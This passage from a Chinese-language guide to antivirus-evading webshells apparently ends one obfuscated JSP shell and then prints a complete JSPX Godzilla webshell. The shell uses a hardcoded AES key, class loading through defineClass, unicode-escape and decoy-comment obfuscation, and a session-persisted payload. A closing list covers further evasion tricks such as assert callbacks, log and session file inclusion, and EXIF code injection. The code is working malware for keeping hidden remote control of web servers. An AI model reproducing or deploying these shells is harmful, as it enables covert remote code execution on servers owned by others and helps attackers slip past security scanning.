            return govsb_OivaHoGWp.doFinal/*edusb_FF16B22heUkTn*/(govsb_O0SB2EIXBcH);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_U13 = java.util.Base64./*edusb_z0dnnWNU*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_Vlh*/decode(request.getParameter(govsb_72));
        govsb_U13 = govsb_M0fZ0kevgRG(govsb_U13,false);
        if (session.getAttribute/*edusb_pMOWtJ9gh7Qcd6*/("payload") == null) {
            session.setAttribute("payload", new govsb_qKamuqJcPde0n8u(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_P8eY*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_XKY*/.govsb_0m(govsb_U13));
        } else {
            request.setAttribute("parameters", govsb_U13);
            java.io.ByteArrayOutputStream govsb_j4Rcb7Hmi4TXn = new java.io./*edusb_gplLy*/ByteArrayOutputStream();
            Object govsb_9cK6pvpK3ke3r = /*edusb_k4fvw1MUkRM*/((Class) session.getAttribute("payload"))./*edusb_AS6HrR6*//*edusb_WfyUgnBGElBq7*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_n07v2ENkMLg8Ael*/;
            govsb_9cK6pvpK3ke3r.equals(govsb_j4Rcb7Hmi4TXn);
            govsb_9cK6pvpK3ke3r.equals(pageContext);
            response.getWriter().write("06AD438AADCFF8FA6FFB85E3C0233924".substring(837575-837575, 16));
            govsb_9cK6pvpK3ke3r.toString();
            response.getWriter().write(java.util.Base64/*edusb_C6wwTgUQOho8*/.getEncoder()/*edusb_esQTUgj*/.encodeToString(govsb_M0fZ0kevgRG(govsb_j4Rcb7Hmi4TXn.toByteArray(),true)));
            response.getWriter().write("06AD438AADCFF8FA6FFB85E3C0233924".substring(16));
        }
    } catch (Exception e) {
    }
%>
```

### 4.7 JSPX免杀WebShell（Godzilla JAVA_AES_BASE64）

**特征：**
- JSP XML格式（`<jsp:root>`、`<jsp:declaration>`、`<jsp:scriptlet>`），适用于严格XML解析环境
- AES加密，密钥`e43edd78db1e1348`
- 自定义ClassLoader + `defineClass`
- Session持久化Payload
- MD5响应标记：`E2B99F4A666E2FF11F5E126B64FDEAB1`
- 随机注释`/*tencentXXX*/`混淆（模拟腾讯产品名）
- 数字运算混淆：`89969-89969`代替`0`

```xml
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:declaration>
   String baiduJ0W = "e43edd78db1e1348";
    String baidu8IPi8W = "Tas9er";
    class baidugqy5LHTJKqeb extends /*tencentGzet37ZseVadcgB*/ClassLoader {
        public baidugqy5LHTJKqeb(ClassLoader baiduv) {
            super/*tencent1Mvm*/(baiduv);
        }
        public Class baiduz9ede(byte[] baidufUvd9iFjVgU9Z) {
            return super./*tencentiE9ECTmzFB6kv*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*tencentYlF*/(baidufUvd9iFjVgU9Z, 89969-89969, baidufUvd9iFjVgU9Z.length);
        }
    }
    public byte[] baidupaYXbqUWdBJF8fv(byte[] baiduCRBT2, boolean baiduYplewZkHgh) {
        try {
            j\u0061\u0076\u0061\u0078./*tencentcpdagVPfrqExrtV*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher baiduF6ZaKsodz2 = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*tencent0A*/("AES");
            baiduF6ZaKsodz2.init(baiduYplewZkHgh?89969/89969:89969/89969+89969/89969,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*tencent6g5lu0*/SecretKeySpec/*tencentEVDqsr6T*/(baiduJ0W.getBytes(), "AES"));
            return baiduF6ZaKsodz2.doFinal/*tencentgDe0QRf*/(baiduCRBT2);
        } catch (Exception e) {
            return null;
        }
     }
    </jsp:declaration>
    <jsp:scriptlet>
try {
        byte[] baiduO = java.util.Base64./*tencentWOFXVYwHEu*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*tencentQCKeh9Kjbqq*/decode(request.getParameter(baidu8IPi8W));
        baiduO = baidupaYXbqUWdBJF8fv(baiduO,false);
        if (session.getAttribute/*tencentXYIqomq2FPaShG*/("payload") == null) {
            session.setAttribute("payload", new baidugqy5LHTJKqeb(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*tencenthFgUqEfsZdjQd*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*tencentdc*/.baiduz9ede(baiduO));
        } else {
            request.setAttribute("parameters", baiduO);
            java.io.ByteArrayOutputStream baiduXHeudNh9eWXPEzl = new java.io./*tencent3pCLFasI1f*/ByteArrayOutputStream();
            Object baiduVXwXhrwV6sA = /*tencent2T7CXz3cgw*/((Class) session.getAttribute("payload"))./*tencent9Iy4b7lp6bGfajZ*//*tencentAZ3*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*tencentYRVrS7eFWSG*/;
            baiduVXwXhrwV6sA.equals(baiduXHeudNh9eWXPEzl);
            baiduVXwXhrwV6sA.equals(pageContext);
            response.getWriter().write("E2B99F4A666E2FF11F5E126B64FDEAB1".substring(89969-89969, 16));
            baiduVXwXhrwV6sA.toString();
            response.getWriter().write(java.util.Base64/*tencent5AhC0ASO*/.getEncoder()/*tencent8n21*/.encodeToString(baidupaYXbqUWdBJF8fv(baiduXHeudNh9eWXPEzl.toByteArray(),true)));
            response.getWriter().write("E2B99F4A666E2FF11F5E126B64FDEAB1".substring(16));
        }
    } catch (Exception e) {
    }
</jsp:scriptlet>
</jsp:root>
```

### 4.8 内容免杀进阶技巧
- **变量函数化**：`$_GET[a]($_GET[b])` 替代直接 `eval($_POST[x])`
- **类方法调用**：使用类的__call/__invoke魔术方法
- **回调函数数组**：`array_map('assert',array($_POST[x]))`
- **反序列化利用**：构造POP链触发
- **文件包含+日志注入**：UA/Referer注入代码到日志，包含日志文件
- **SESSION文件包含**：注入代码到SESSION，包含SESSION文件
- **临时文件利用**：竞争条件上传+包含
- **数据库写入**：代码写入数据库字段，通过文件包含/数据库日志执行
- **图片EXIF注入**：将PHP代码写入EXIF的Comment字段，避免二次渲染破坏

